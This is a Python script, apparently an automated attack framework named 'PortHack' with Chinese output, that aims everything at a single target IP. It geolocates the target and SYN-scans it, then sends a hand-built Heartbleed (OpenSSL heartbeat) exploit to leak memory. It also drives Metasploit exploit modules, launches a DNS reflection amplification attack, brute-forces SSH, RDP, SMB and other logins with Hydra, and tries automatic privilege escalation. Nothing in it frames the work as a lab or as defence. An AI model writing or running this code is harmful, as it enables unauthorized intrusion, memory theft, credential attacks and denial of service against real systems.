#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import json
import time
import fcntl
import socket
import struct
import select
import signal
import binascii
import platform
import threading
import subprocess
import importlib.util
from queue import Queue
from pathlib import Path
from init import init_rely
from urllib.parse import urlparse
#print(os.path.join(os.path.dirname(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "lib"))

def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)  # 加锁
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)  # 解锁
        time.sleep(0.05)

if sys.platform == "win32":
    kernel32 = ctypes.windll.kernel32
    handle = kernel32.GetStdHandle(-11)
    mode = ctypes.c_ulong()
    kernel32.GetConsoleMode(handle, ctypes.byref(mode))
    mode.value |= 0x0004
    kernel32.SetConsoleMode(handle, mode)

signal.signal(signal.SIGINT, lambda sig, frame: (safe_print("\033[31m[!] Stop by user.\033[0m"), os._exit(0)))

if len(sys.argv) == 1:
    print("未提供IP")
    sys.exit(0)

if sys.argv[1] == 'init':
    init_rely()
elif sys.argv[1] == '-h' or sys.argv[1] == '-help':
    safe_print("python3 "+sys.argv[0]+" [IP]")
    sys.exit(0)

import scan
import warnings
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError
from colorama import Fore,init
warnings.filterwarnings(
    "ignore",
    message=".*Diffie-Hellman over finite fields.*"
)
from scapy.all import IP, TCP, sr1
init(autoreset=True)

def wait_msf_ready(password, server="127.0.0.1", port=55553, ssl=False, timeout=180):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            with socket.create_connection((server, port), timeout=2):
                pass
        except OSError:
            print(f"{Fore.GREEN}[*] 等待 msfrpcd 端口... {int(time.time()-t0)}s")
            time.sleep(2)
            continue
        try:
            client = MsfRpcClient(password, server=server, port=port, ssl=ssl, timeout=10)
            _ = client.core.version
            print(f"{Fore.GREEN}[+] MSF RPC 就绪（{int(time.time()-t0)}s）")
            return client
        except Exception as e:
            print(f"{Fore.GREEN}[*] msfrpcd 正在初始化: {e!r}")
            time.sleep(2)
    raise TimeoutError(f"{Fore.YELLOW}MSF RPC {timeout}s 内未就绪")

class PortHack:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.config = self.load_config()
        self.modules = []
        self.msf_client = None
        self.msf_process = None
        self.m = None
        self.load_num = 0
        self.url = None
        self.session = None
        self.TTL_MAP = {64: "Linux/Unix", 128: "Windows", 255: "网络设备"}
        self._TTL_RE = re.compile(r"[Tt][Tt][Ll][=:：]\s*(\d+)")
        self.user = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user.dic')
        self.load_all_modules(self.load_num)

    def build_heartbeat(self, payload, payload_len):
        record = bytearray()
        record.append(0x18)
        record.extend([0x03, 0x01])
        record.extend(struct.pack('>H', 0x0003 + payload_len + 1))

        record.append(0x01)
        record.extend(struct.pack('>H', payload_len))
        record.extend(payload)
        record.extend(b'\x00' * (payload_len - len(payload)))
        return record

    def tls_handshake(self, target_ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, port))
        client_hello = bytearray()
        client_hello.append(0x16)
        client_hello.extend([0x03, 0x01])
        hs_len = 0x0051
        client_hello.extend(struct.pack('>H', hs_len))
        client_hello.append(0x01)
        client_hello.extend(b'\x00\x00\x4d')
        client_hello.extend([0x03, 0x01])
        client_hello.extend(b'\x00' * 32)
        client_hello.append(0x00)
        client_hello.extend(b'\x00\x02')
        client_hello.extend(b'\x00\x2f')
        client_hello.append(0x01)
        client_hello.append(0x00)
        client_hello.extend(b'\x00\x00')
        sock.send(client_hello)

        while True:
            try:
                header = sock.recv(5)
                if not header:
                    break
                if header[0] == 0x15:
                    return None
            except:
                break
        return sock

    def is_url(self, s: str) -> bool:
        s = s.strip()
        if not s:
            return False
        if '://' not in s:
            s = 'http://' + s
        try:
            host = urlparse(s).hostname
        except ValueError:
            return False
        if not host:
            return False

        if re.fullmatch(r'[\d.]+', host):
            return False

        if re.fullmatch(
            r'(?i)([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}',
            host
        ):
            return True
        return False

    def openssl_bug(self, target_ip=None, port=443):
        try:
            global m
            sock = self.tls_handshake(target_ip, port)
            if not sock:
                print("TLS 握手失败")

            malicious_payload = self.build_heartbeat(b'\x01\x02\x03', 0x4000)
            sock.send(malicious_payload)

            time.sleep(1)
            leaked = b''
            while True:
                try:
                    r, _, _ = select.select([sock], [], [], 1.0)
                    if not r:
                        break
                    data = sock.recv(65536)
                    if not data:
                        break
                    leaked += data
                except:
                    break

            sock.close()

            if len(leaked) > 5:
                if leaked[0] == 0x18:
                    offset = 5 + 1 + 2
                    heart_data = leaked[offset:]
                    printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in heart_data)
                    print(printable)
                    print("[+] Hex:")
                    print(binascii.hexlify(heart_data[:]).decode())
                else:
                    print("未收到有效心跳响应")
            else:
                print("未获取到数据")
        except Exception as e:
            #print(f"Error: {e}")
            pass

    def load_config(self):
        config_path = os.path.join(os.path.dirname(__file__), "config.json")
        with open(config_path, "r") as f:
            return json.load(f)

    def load_all_modules(self, load_num):
        modules_dir = os.path.join(os.path.dirname(__file__), "modules")
        for root, dirs, files in os.walk(modules_dir):
            for file in files:
                if file.endswith(".py") and not file.startswith("__"):
                    module_path = os.path.join(root, file)
                    self._load_module(module_path,1)
                    load_num = load_num + 1
        safe_print(f"{Fore.GREEN}[+] 已加载 {len(self.modules)} 个漏洞利用模块\n")

    def _load_module(self, path, num):
        try:
            spec = importlib.util.spec_from_file_location("module", path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            if hasattr(mod, "Module"):
                module_instance = mod.Module()
                module_instance.porthack = self
                self.modules.append(module_instance)
                if not (num >= 20):
                    #safe_print(f"    └─ {module_instance.name}")
                    safe_print(f"    \\___{module_instance.name}")
        except Exception as e:
            safe_print(f"{Fore.RED}[-] 加载模块失败 {path}: {e}")

    def _start_msf_rpc(self):
        try:
            test_client = MsfRpcClient(
                self.config["msf_rpc_pass"],
                server=self.config["msf_rpc_host"],
                port=self.config["msf_rpc_port"],
                ssl=False
            )
            safe_print(f"{Fore.GREEN}[+] MSF RPC 服务已在运行")
            return True
        except:
            pass

        safe_print(f"{Fore.GREEN}[*] 正在启动 MSF RPC 服务...")
        cmd = [
            "msfrpcd",
            "-U", "msf",
            "-P", self.config["msf_rpc_pass"],
            "-S",
            "-a", self.config["msf_rpc_host"],
            "-p", str(self.config["msf_rpc_port"]),
            "-f"
        ]
        try:
            with open(os.devnull, 'wb') as devnull:
                self.msf_process = subprocess.Popen(
                    cmd,
                    stdout=devnull,
                    stderr=devnull,
                    preexec_fn=os.setsid
                )
            for _ in range(30):
                time.sleep(1)
                try:
                    test_client = MsfRpcClient(
                        self.config["msf_rpc_pass"],
                        server=self.config["msf_rpc_host"],
                        port=self.config["msf_rpc_port"],
                        ssl=False
                    )
                    safe_print(f"{Fore.GREEN}[+] MSF RPC 服务启动成功")
                    return True
                except:
                    pass
            safe_print(f"{Fore.RED}[-] MSF RPC 服务启动超时")
            return False
        except Exception as e:
            safe_print(f"{Fore.RED}[-] 启动 MSF RPC 服务失败: {e}")
            return False

    def connect_msf(self):
        if self.msf_client is None:
            if self._start_msf_rpc():
                try:
                    #self.msf_client = MsfRpcClient(
                    self.msf_client = wait_msf_ready(
                        self.config["msf_rpc_pass"],
                        server=self.config["msf_rpc_host"],
                        port=self.config["msf_rpc_port"],
                        ssl=False
                    )
                    safe_print(f"{Fore.GREEN}[+] MSF RPC 连接成功")
                except Exception as e:
                    safe_print(f"{Fore.RED}[-] MSF RPC 连接失败: {e}")
                    sys.exit(1)
            else:
                safe_print(f"{Fore.RED}[-] 无法启动或连接至 MSF RPC 服务，MSF 模块将不可用")
        return self.msf_client

    def stealth_port_scan_syn(self, ports):
        open_ports = []
        for port in ports:
            pkt = IP(dst=self.target_ip)/TCP(dport=port, flags="S")
            ans = sr1(pkt, timeout=1, verbose=0)
            if ans and ans.haslayer(TCP) and ans.getlayer(TCP).flags == 0x12:
                open_ports.append(port)
                rst = IP(dst=self.target_ip)/TCP(dport=port, flags="R")
                sr1(rst, timeout=0.1, verbose=0)
            time.sleep(0.3)
        return open_ports

    def stealth_port_scan_tcp(self, ports):
        open_ports = []
        for port in ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            try:
                if s.connect_ex((self.target_ip, port)) == 0:
                    open_ports.append(port)
            except Exception:
                pass
            finally:
                s.close()
        return open_ports

    def collect_all_module_ports(self):
        ports = set()
        for mod in self.modules:
            if mod.port is not None:
                ports.add(mod.port)
        return list(ports)

    def guess_os(self, target_ip: str) -> str:
        count_flag = "-n" if os.name == "nt" else "-c"
        try:
            result = subprocess.run(
                ["ping", count_flag, "4", target_ip],
                capture_output=True, text=True, timeout=10,
            )
        except subprocess.TimeoutExpired:
            return "未知"
        except (OSError, FileNotFoundError):
            return "未知"
        ttls = [int(x) for x in self._TTL_RE.findall(result.stdout)]
        if not ttls:
            return "未知"
        ttl = max(ttls)
        candidates = sorted(k for k in self.TTL_MAP if k >= ttl)
        return self.TTL_MAP[candidates[0]] if candidates else "未知"

    def run_full_assault(self):
        safe_print(f"[*] 目标: {self.target_ip}")
        if self.is_url(self.target_ip):
            self.url = self.target_ip
            target_ip = socket.gethostbyname(self.target_ip)
            print(f"[*] IPv4 地址: {self.target_ip}")


#        try:
#            out = subprocess.run(f"ping {'-n' if os.name=='nt' else '-c'} 4 {target_ip}",
#                         shell=True, capture_output=True, text=True, timeout=10).stdout
#            ttls = [int(x) for x in re.findall(r"(?:TTL|ttl|生存时间)=?(\d+)", out)]
#            ttl = sum(ttls)//len(ttls) if ttls else None
#            # OS 判断
#            if ttl:
#                possible = [k for k in TTL_MAP if k >= ttl]
#                system = TTL_MAP[min(possible)] if possible else "未知"
#            else:
#                system = "未知"
#        except:
#            system = "未知"


        system = self.guess_os(self.target_ip)
        try:
            mobile = scan.info(socket.gethostbyname(self.target_ip))["is_mobile"]
            if mobile and (os == 'Linux/Unix'):
                system = "Android?"
        except:
            pass
        safe_print(f"[*] 目标操作系统：{system}")
        try:
           proxy = scan.info(socket.gethostbyname(self.target_ip))["is_proxy"]
           if proxy:
               safe_print("[*] 当前攻击为代理服务器")
        except:
            pass
        try:
            safe_print(f'[*] 目标位于：{scan.info(socket.gethostbyname(self.target_ip))["country"]+scan.info(socket.gethostbyname(self.target_ip))["region"]+scan.info(socket.gethostbyname(self.target_ip))["city"]}')
        except Exception as e:
            #print(e)
            pass
        ports_to_scan = self.collect_all_module_ports()
        try:
            open_ports = self.stealth_port_scan_syn(ports_to_scan)
        except:
            open_ports = self.stealth_port_scan_tcp(ports_to_scan)
        safe_print(f"[+] 发现开放端口: {open_ports}")
        openssl_bug = self.openssl_bug(self.target_ip)
        if not self.m == None:
            print(openssl_bug)

        safe_print(f"{Fore.GREEN}[*] 等待 MSF RPC 就绪...")
        try:
            self.connect_msf()
        except Exception as e:
            safe_print(f"{Fore.RED}[-] RPC 未就绪: {e!r}，中止")
            return

        for port in open_ports:
            t = threading.Thread(target=self._try_dynamic_msf, args=(port,))
            t.start()
        t_reflect = threading.Thread(target=self._start_reflection_attack)
        t_reflect.start()

        # 构建任务队列
        task_queue = Queue()
        for mod in self.modules:
            if mod.name == "Dynamic MSF Exploit Dispatcher":
                continue  # 动态模块由 _try_dynamic_msf 单独调用，不入队列
            if mod.port is None or mod.port in open_ports:
                task_queue.put(mod)

        web_ports = [80, 443, 8080, 8443]
        success_event = threading.Event()
        threads = []
        for _ in range(min(8, task_queue.qsize())):
            t = threading.Thread(target=self._attack_worker, args=(task_queue, success_event))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        if not success_event.is_set():
            self._launch_distributed_bruteforce(open_ports,self.user)

    def _attack_worker(self, queue, success_event):
        while not queue.empty() and not success_event.is_set():
            mod = queue.get()
            try:
                safe_print(f"{Fore.GREEN}[*] 尝试模块: {mod.name}")
                kwargs = {"target_ip": self.target_ip, "lhost": self.config["lhost"]}
                if hasattr(mod, 'use_msf') and mod.use_msf:
                    mod.msf_client = self.connect_msf()
                if mod.port is not None:
                    kwargs["target_port"] = mod.port
                elif mod.name == "Port Spoofing & Service Trigger Exploits":
                    kwargs["target_port"] = None
                elif mod.name == "firewall kill":
                    kwargs["target_port"] = None
                elif mod.name == "Distributed Hydra Brute-Force Orchestrator":
                    pass
                elif hasattr(mod, 'session') and mod.session:
                    if self.session is not None:
                        kwargs["session"] = self.session
                elif hasattr(mod, 'url') and mod.url:
                    kwargs["url"] = self.url
                if mod.name == "File Exposure Scanner":
                    continue
                else:
                    success, result = mod.exploit(**kwargs)
                if success:
                    safe_print(f"{Fore.GREEN}[+] 攻击成功！{result}")
                    success_event.set()
                    if not self._is_root(result):
                        self._auto_privesc(result)
                else:
                    safe_print(f"{Fore.RED}[-] {mod.name} 失败: {result}")
            except Exception as e:
                safe_print(f"{Fore.RED}[-] {mod.name}执行异常: {e}")
            finally:
                queue.task_done()

    def _start_reflection_attack(self):
        for mod in self.modules:
            if mod.name == "DNS Reflection Amplification Attack":
                mod.exploit(target_ip=self.target_ip)
                break

    def _launch_distributed_bruteforce(self, open_ports,user):
        safe_print(f"{Fore.GREEN}[*] 尝试分布式密码爆破...")
        for mod in self.modules:
            if mod.name == "Distributed Hydra Brute-Force Orchestrator":
                for port in open_ports:
                    service = self._guess_service(port)
                    if service in ["ssh", "ftp", "telnet", "rdp", "vnc", "mysql", "smb"]:
                        success, msg = mod.exploit(target_ip=self.target_ip, target_port=port, service=service, user=user)
                        if success:
                            return
                break

    def _try_dynamic_msf(self, port,**kwargs):
        """动态调用 MSF 模块尝试利用指定端口"""
        for mod in self.modules:
            if mod.name == "Dynamic MSF Exploit Dispatcher":
                safe_print(f"{Fore.GREEN}[*] 动态 MSF 调度器正在处理端口 {port}...")
                try:
                    if hasattr(mod, 'use_msf') and mod.use_msf:
                        mod.msf_client = self.connect_msf()
                    success, result = mod.exploit(
                        target_ip=self.target_ip,
                        target_port=port,
                        lhost=self.config["lhost"]
                    )
                    if success:
                        safe_print(f"{Fore.GREEN}[+] 动态 MSF 端口利用成功 {port}: {result}")
                        # 可以在这里记录 session 等
                except Exception as e:
                    safe_print(f"{Fore.RED}[-] 动态 MSF 调度异常: {e}")
                break

    def _is_root(self, result):
        return "root" in str(result).lower() or "uid=0" in str(result)

    def _guess_service(self, port):
        guess = {21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http Web", 445: "smb", 3389: "rdp", 3306: "mysql", 1433: "mssql", 8080: "http Web"}
        if 5900 <= port <= 5910:
            return "vnc"
        return guess.get(port, "unknown")

    def _auto_privesc(self, session_info):
        safe_print(f"{Fore.GREEN}[*] 尝试自动本地提权...")
        for mod in self.modules:
            if mod.port is None and "privesc" in mod.name.lower():
                try:
                    # 只有 Mali 提权模块需要 session 参数
                    if mod.name == "Qualcomm Mali GPU Driver Local Privilege Escalation":
                        success, msg = mod.exploit(session=self.session)
                    else:
                        success, msg = mod.exploit()
                    if success:
                        safe_print(f"{Fore.GREEN}[+] 提权成功: {msg}")
                        return
                except Exception as e:
                    safe_print(f"{Fore.RED}[-] 提权模块执行异常: {e}")

if __name__ == "__main__":
    pk = PortHack(sys.argv[1])
    try:
        pk.run_full_assault()
    finally:
        if pk.msf_process:
            os.killpg(os.getpgid(pk.msf_process.pid), signal.SIGTERM)
